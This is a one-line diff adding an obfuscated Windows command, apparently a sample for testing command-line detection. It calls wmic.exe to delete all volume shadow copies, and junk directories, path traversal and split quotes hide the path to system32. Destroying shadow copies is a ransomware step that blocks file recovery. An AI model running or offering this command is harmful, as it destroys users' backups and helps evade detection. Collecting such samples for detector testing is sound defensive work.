@@ -1,0 +1,1 @@
+"C:\ny\uepyb\..\..\Windows\pchdw\s\..\..\sy"stem"32\k\aph\..\..\wbem\c\..\wmic.exe" "shadowcopy" "delete"
